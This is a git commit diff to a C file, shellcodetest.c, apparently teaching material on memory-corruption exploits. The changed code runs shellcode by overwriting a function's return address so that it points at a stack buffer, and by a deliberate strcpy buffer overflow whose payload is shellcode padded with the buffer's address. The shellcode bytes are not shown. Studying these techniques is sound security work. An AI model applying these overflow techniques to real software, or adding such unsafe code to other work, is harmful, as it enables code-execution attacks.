469307465a7747dd40c648fb5e5647877c0d93f3
Kostas Chatzikokolakis <kostas@chatzi.org>
2021-05-20 16:03:58 +0300

    shellcodetest: put the code in the stack

--- shellcodetest.c
+++ shellcodetest.c
@@ -12,27 +12,38 @@ void main() {
 	// overflow();
 }
 
-// run the shellcode by directly changing the return address
+void overwrite_return_address(void* address) {
+	// hackish way of getting a pointer to the return address (4 bytes below the arg)
+	void** ret_addr = (void**)((void*)&address - 4);
+	*ret_addr = address;
+}
+
+// run the shellcode directly changing the return address
 void direct() {
-	long *ret;
-	ret = (long *)&ret + 2;		// hackish way of getting a pointer to the return address
-	(*ret) = (long)shellcode;	// set the return address to our code!
+	char buffer[sizeof(shellcode)];		// large enough buffer
+	memcpy(buffer, shellcode, sizeof(shellcode));
+
+	overwrite_return_address(buffer);
 }
 
 // run the shellcode via overflow
-char large_string[128];
+char payload[128];
 void overflow() {
 	char buffer[96];	// the target buffer
 
-	// the large string is filled with the address of the buffer, which will be written at the return address
-	for (int i = 0; i < sizeof(large_string)/4; i++)
-		((long*)large_string)[i] = (long)buffer;
+	// prepare the payload
+	//
+	// the payload is filled with the address of the buffer, to overwrite the return address
+	for (int i = 0; i < sizeof(payload)/4; i++)
+		((long*)payload)[i] = (long)buffer;
 
+	// and the shellcode in the beginning
 	for (int i = 0; i < strlen(shellcode); i++)
-		large_string[i] = shellcode[i];
+		payload[i] = shellcode[i];
 
-	large_string[sizeof(large_string)-1] = 0;
+	payload[sizeof(payload)-1] = 0;
 
-	strcpy(buffer, large_string);
+	// the actual overflow attack
+	strcpy(buffer, payload);
 }
 
